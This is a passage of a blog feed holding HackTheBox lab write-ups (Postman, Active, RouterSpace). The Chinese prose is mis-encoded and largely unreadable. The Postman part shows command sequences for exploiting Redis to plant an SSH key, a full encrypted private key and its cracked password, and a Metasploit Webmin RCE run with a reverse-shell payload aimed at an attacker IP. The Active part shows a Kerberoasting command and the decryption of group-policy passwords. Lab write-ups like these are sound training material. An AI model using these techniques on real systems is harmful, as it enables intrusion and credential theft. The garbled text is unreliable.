<p>æˆ‘ä»¬å‘ç°ä¸€ä¸ªuploadç›®å½•ï¼Œè®¿é—®å‘ç°åªæœ‰ä¸€äº›å›¾ç‰‡è€Œå·²<br><img src="https://img-blog.csdnimg.cn/b3c145006edb4713a933104a79cae707.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>webæ”»å‡»æ— æœï¼Œé‚£æˆ‘ä»¬å°†æ³¨æ„åŠ›è½¬ç§»åˆ°redisæ•°æ®åº“ä¸Šï¼Œå°è¯•æ˜¯å¦å­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´<br><img src="https://img-blog.csdnimg.cn/f8887a8690934a50aefef93ab24f104a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>æˆ‘ä»¬é¦–å…ˆå°†æˆ‘ä»¬çš„ssh-keyå†™å…¥åˆ°key.txtæ–‡ä»¶ä¸­<br><img src="https://img-blog.csdnimg.cn/30cc35f7466642ae8fc852db4f111dc6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å†æŠŠkey.txtæ–‡ä»¶å†…å®¹å†™å…¥redisç¼“å­˜ä¸­<br><img src="https://img-blog.csdnimg.cn/3f83ac49ad7546059774aba3c56a198e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">10.10.10.160:6379&gt; config get dir</span><br><span class="line">1) <span class="string">&quot;dir&quot;</span></span><br><span class="line">2) <span class="string">&quot;/var/lib/redis&quot;</span></span><br><span class="line">10.10.10.160:6379&gt; config <span class="built_in">set</span> /var/lib/redis/.ssh</span><br><span class="line">(error) ERR Wrong number of arguments <span class="keyword">for</span> CONFIG <span class="built_in">set</span></span><br><span class="line">10.10.10.160:6379&gt; config <span class="built_in">set</span> dir /var/lib/redis/.ssh</span><br><span class="line">OK</span><br><span class="line">10.10.10.160:6379&gt; config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">10.10.10.160:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">10.10.10.160:6379&gt; <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å°è¯•ç™»å½•åˆ°è¯¥ä¸»æœºä¸Š<br><img src="https://img-blog.csdnimg.cn/795ba910f639419d8987d79f0ec483b2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ä¸Šä¼ linpeas.shè„šæœ¬åˆ°ç›®æ ‡ä¸»æœºä¸Šå‘ç°ï¼Œä¸»æœºçš„/optç›®å½•ä¸Šå­˜åœ¨ä¸€ä»½ç§é’¥å¤‡ä»½</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis@Postman:~$ cat /opt/id_rsa.bak</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C</span><br><span class="line"></span><br><span class="line">JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX</span><br><span class="line">cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2</span><br><span class="line">7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6</span><br><span class="line">cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9</span><br><span class="line">1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv</span><br><span class="line">EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP</span><br><span class="line">UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY</span><br><span class="line">Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK</span><br><span class="line">t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS</span><br><span class="line">5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke</span><br><span class="line">P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6</span><br><span class="line">jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge</span><br><span class="line">SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i</span><br><span class="line">l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X</span><br><span class="line">0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p</span><br><span class="line">S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR</span><br><span class="line">hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+</span><br><span class="line">Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V</span><br><span class="line">XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD</span><br><span class="line">b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi</span><br><span class="line">WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh</span><br><span class="line">KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm</span><br><span class="line">npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ</span><br><span class="line">VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W</span><br><span class="line">X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å°†å…¶ä¸‹è½½åˆ°æœ¬æœºï¼Œå¹¶ä½¿ç”¨ssh2john.pyå°†å…¶å“ˆå¸Œå¯¼å‡º<br><img src="https://img-blog.csdnimg.cn/66c4d071bea24d2bb4891441037f3a8d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åä½¿ç”¨johnè¿›è¡Œç ´è§£å¾—åˆ°å¯†ç ï¼Œå¾—åˆ°å¯†ç computer2008ï¼Œç™»å½•åˆ°Mattè´¦æˆ·<br><img src="https://img-blog.csdnimg.cn/40e53a09c8a549a19313e7fb22d13443.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ææƒroot"><a href="#ææƒroot" class="headerlink" title="ææƒroot"></a>ææƒroot</h2><p>æˆ‘ä»¬è®¿é—®10000ç«¯å£å‘ç°æ˜¯ä¸ªwebminåº”ç”¨ç¨‹åºï¼Œåœ¨EDBå‘ç°å­˜åœ¨RCEæ¼æ´å¹¶åœ¨MSFä¸­é›†æˆ<br><img src="https://img-blog.csdnimg.cn/83ea6c04c24c457e896f109ef6a6cfbf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/ae16ec96fd1d44ceac7112af658419af.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ç›´æ¥ä½¿ç”¨ç¬¬äºŒä¸ªå¹¶å¡«å†™å¥½å‚æ•°åï¼Œå¾—åˆ°rootæƒé™</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use 2</span><br><span class="line">[*] Using configured payload cmd/unix/reverse_perl</span><br><span class="line">msf6 exploit(linux/http/webmin_packageup_rce) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/http/webmin_packageup_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   PASSWORD                    yes       Webmin Password</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span><br><span class="line">   RPORT      10000            yes       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /                yes       Base path <span class="keyword">for</span> Webmin application</span><br><span class="line">   USERNAME                    yes       Webmin Username</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/reverse_perl):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Webmin &lt;= 1.910</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> password computer2008</span><br><span class="line">password =&gt; computer2008</span><br><span class="line">msf6 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> rhosts 10.10.10.160</span><br><span class="line">rhosts =&gt; 10.10.10.160</span><br><span class="line">msf6 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> ssl <span class="literal">true</span></span><br><span class="line">[!] Changing the SSL option<span class="string">&#x27;s value may require changing RPORT!</span></span><br><span class="line"><span class="string">ssl =&gt; true</span></span><br><span class="line"><span class="string">msf6 exploit(linux/http/webmin_packageup_rce) &gt; show options </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Module options (exploit/linux/http/webmin_packageup_rce):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Name       Current Setting  Required  Description</span></span><br><span class="line"><span class="string">   ----       ---------------  --------  -----------</span></span><br><span class="line"><span class="string">   PASSWORD   computer2008     yes       Webmin Password</span></span><br><span class="line"><span class="string">   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span></span><br><span class="line"><span class="string">   RHOSTS     10.10.10.160     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span></span><br><span class="line"><span class="string">   RPORT      10000            yes       The target port (TCP)</span></span><br><span class="line"><span class="string">   SSL        true             no        Negotiate SSL/TLS for outgoing connections</span></span><br><span class="line"><span class="string">   TARGETURI  /                yes       Base path for Webmin application</span></span><br><span class="line"><span class="string">   USERNAME                    yes       Webmin Username</span></span><br><span class="line"><span class="string">   VHOST                       no        HTTP server virtual host</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Payload options (cmd/unix/reverse_perl):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Name   Current Setting  Required  Description</span></span><br><span class="line"><span class="string">   ----   ---------------  --------  -----------</span></span><br><span class="line"><span class="string">   LHOST                   yes       The listen address (an interface may be specified)</span></span><br><span class="line"><span class="string">   LPORT  4444             yes       The listen port</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Exploit target:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Id  Name</span></span><br><span class="line"><span class="string">   --  ----</span></span><br><span class="line"><span class="string">   0   Webmin &lt;= 1.910</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf6 exploit(linux/http/webmin_packageup_rce) &gt; set username Matt</span></span><br><span class="line"><span class="string">username =&gt; Matt</span></span><br><span class="line"><span class="string">msf6 exploit(linux/http/webmin_packageup_rce) &gt; set lhost 10.10.14.9</span></span><br><span class="line"><span class="string">lhost =&gt; 10.10.14.9</span></span><br><span class="line"><span class="string">msf6 exploit(linux/http/webmin_packageup_rce) &gt; set ssl true</span></span><br><span class="line"><span class="string">[!] Changing the SSL option&#x27;</span>s value may require changing RPORT!</span><br><span class="line">ssl =&gt; <span class="literal">true</span></span><br><span class="line">msf6 exploit(linux/http/webmin_packageup_rce) &gt; exploit</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/6427bab560c04677b571daeed8ba6947.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>æœªæˆæƒè®¿é—®æ¼æ´</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Active</title>
    <url>/2022/03/20/Active/</url>
    <content><![CDATA[<h2 id="é¶æœºä¿¡æ¯"><a href="#é¶æœºä¿¡æ¯" class="headerlink" title="é¶æœºä¿¡æ¯"></a>é¶æœºä¿¡æ¯</h2><p><img src="https://img-blog.csdnimg.cn/eda8a039099d4943bbdadeca0b30a10a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å¯ä»¥çœ‹åˆ°ä¸»æœºå¼€æ”¾äº†135,445,88è¿™äº›å¸¸è§çš„ç«¯å£<br><img src="https://img-blog.csdnimg.cn/5cf14b42521c4a969e73a389b2407517.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<span id="more"></span>

<p>å¯ä»¥åŒ¿åç™»å½•smbæœåŠ¡<br><img src="https://img-blog.csdnimg.cn/e3d0be21298842868f97f94a04e6481e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>æˆ‘ä»¬çœ‹åˆ°å­˜åœ¨ä¸€ä¸ª<code>Replication</code>çš„ç›®å½•ï¼Œæˆ‘ä»¬å°è¯•ç™»å½•è¿›è¿™ä¸ªç›®å½•çœ‹çœ‹ã€‚å‘ç°å­˜åœ¨<code>active.htb</code>ç›®å½•ï¼Œå¹¶ä¸”è¯¥ç›®å½•ä¸‹æœ‰å‡ ä¸ªæœ‰ä»·å€¼çš„ç›®å½•ä¿¡æ¯<br><img src="https://img-blog.csdnimg.cn/5539c4e4a9ad4b5da24575f1cae90b36.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

<p>æˆ‘ç»è¿‡ç»†å¿ƒæŸ¥çœ‹åï¼Œåªæœ‰åœ¨<code>\active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Groups\</code>ç›®å½•ä¸‹æ‰¾åˆ°ä¸€ä¸ª<code>Groups.xml</code>æ–‡ä»¶ï¼Œç»è¿‡æŸ¥çœ‹è¿™æ˜¯ä¸€ä¸ªç»„ç­–ç•¥æ–‡ä»¶ï¼Œç”¨äºå¸æˆ·ç®¡ç†çš„ç»„ç­–ç•¥å­˜å‚¨åœ¨åŸŸæ§åˆ¶å™¨ä¸Šçš„â€œGroups.xmlâ€æ–‡ä»¶ä¸­ï¼Œè¯¥æ–‡ä»¶éšè—åœ¨ SYSVOL æ–‡ä»¶å¤¹ä¸­ã€‚<br><img src="https://img-blog.csdnimg.cn/3dfeaf7a43274b6db80c1986b56c764c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å› ä¸ºè¿™ä¸ªæ–‡ä»¶ä½¿ç”¨äº†ç‰¹æ®Šçš„ç®—æ³•è¿›è¡ŒåŠ å¯†çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>gpp-decrypt.py</code>è¿™ä¸ªè„šæœ¬è¿›è¡Œè§£å¯†ï¼Œè§£å¯†å‡ºæ¥çš„ç»“æœå¦‚ä¸‹å›¾æ‰€ç¤º<br><img src="https://img-blog.csdnimg.cn/3b1d134c71474bf78e60b56c7094f613.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>æœ‰äº†è´¦æˆ·å’Œå¯†ç åï¼Œæˆ‘ä»¬ç™»å½•SMBæœåŠ¡å¯ä»¥æŸ¥çœ‹æ›´å¤šçš„å…±äº«<br><img src="https://img-blog.csdnimg.cn/a0cabca528234f819d7f3fac04fd95c5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ä½¿ç”¨è´¦æˆ·å¯†ç è®¿é—®Userså…±äº«<br><img src="https://img-blog.csdnimg.cn/3d172d64bc1c426399eefb0f548f5fff.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨æ¡Œé¢ä¸Šæ‰¾åˆ°ç¬¬ä¸€ä¸ªç­”æ¡ˆå€¼<br><img src="https://img-blog.csdnimg.cn/9465fa15bea246989886ef686a471ddc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æˆ‘ä»¬ä½¿ç”¨<code>rpcclient</code>æšä¸¾ç”¨æˆ·åå’Œç”¨æˆ·ç»„<br><img src="https://img-blog.csdnimg.cn/fe3c3ce5801a4fca8ff2eae28e6cc801.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ä½¿ç”¨<code>GetUserSPNs.py</code>è„šæœ¬è·å–ä¸æ™®é€šç”¨æˆ·å¸æˆ·å…³è”çš„æœåŠ¡ä¸»ä½“åç§°ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS -request</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/18a215bbad5044eea14f81afb92ed4a6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬è·å–åˆ°å“ˆå¸Œå€¼åï¼Œä½¿ç”¨johnæ¥ç ´è§£å¾—åˆ°æ˜æ–‡å¯†ç ã€‚<br><img src="https://img-blog.csdnimg.cn/fefaa6cda3e74dbf93337c78a2fededc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç°åœ¨æˆ‘ä»¬æœ‰äº†ç®¡ç†å‘˜çš„å‡­æ®åï¼Œå¯ä»¥å…ˆçœ‹çœ‹ç®¡ç†å‘˜å¯ä»¥è®¿é—®å“ªäº›å…±äº«ã€‚å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®Cç›˜çš„å…±äº«<br><img src="https://img-blog.csdnimg.cn/ddc1a806b114476996349f7104571698.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ä½¿ç”¨è´¦å·å¯†ç ç™»å½•è¿›å…¥Cç›˜ç›®å½•<br><img src="https://img-blog.csdnimg.cn/44b03ce98746402491959058ebfaa443.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¹¶åœ¨æ¡Œé¢ä¸ŠæŸ¥æ‰¾åˆ°root.txtæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/cdd2ab04ba094a5b9ec52a984a7b800f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>RouterSpace</title>
    <url>/2022/03/20/RouterSpace/</url>
    <content><![CDATA[<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>æˆ‘ä»¬å‘ç°ç›®æ ‡ä¸»æœºå¼€æ”¾äº†sshå’ŒwebæœåŠ¡<br><img src="https://img-blog.csdnimg.cn/5048fe7b19bb4f599fb152f151933e22.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä½†æ˜¯æˆ‘ä»¬è®¿é—®webé¡µé¢æ—¶ï¼Œå¹¶æ²¡æœ‰å‘ç°å­˜åœ¨æ–°çš„çªç ´å£ï¼Œä¹Ÿæ²¡æœ‰å‘ç°å­˜åœ¨åŸŸåã€‚å¯æ˜¯æˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªapkæ–‡ä»¶å¯ä¸‹è½½ï¼Œåˆæ­¥çŒœæµ‹è¿™æ˜¯ä¸€ä¸ªæœ‰å…³appçš„æµ‹è¯•äº†<br><img src="https://img-blog.csdnimg.cn/6ed55fe40b034cc78f3bc0c8ce19c716.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<span id="more"></span>

<p>å› ä¸ºæˆ‘è¿™è¾¹å·²ç»å°è¯•è¿‡ä½¿ç”¨linuxå®‰è£…anboxï¼Œæ„Ÿè§‰ä¸å¤ªæˆåŠŸï¼Œæ‰€ä»¥æˆ‘è¿™è¾¹ç›´æ¥ä½¿ç”¨äº†å¤œç¥æ¨¡æ‹Ÿå™¨é…åˆburpsuiteè¿›è¡ŒæŠ“åŒ…åˆ†æï¼Œè¿™ä¸ªæ˜¯å‚è€ƒæ–‡ç« <a href="https://www.cnblogs.com/wjrblogs/p/13683812.html">https://www.cnblogs.com/wjrblogs/p/13683812.html</a><br><img src="https://img-blog.csdnimg.cn/d165e27c0e2b4d74b2377be88ae16afd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

<p>æˆ‘ä»¬åœ¨é‚£é‡Œå‘ç°äº†ä¸€ä¸ªåŸŸå<code>routerspace.htb</code>ï¼Œæˆ‘ä»¬ä½¿ç”¨ç®¡ç†å‘˜æƒé™å°†å…¶å†™è¿›åˆ°hostsæ–‡ä»¶ä¸­(è¿™é‡Œå»ºè®®ä½¿ç”¨cmdå‘½ä»¤è¡Œæ‰“å¼€åï¼Œå†ä½¿ç”¨notepadç¨‹åºå¯¹å…¶è¿›è¡Œä¿®æ”¹)<br><img src="https://img-blog.csdnimg.cn/bd2d89a09f124018beb3c009659fa3c2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
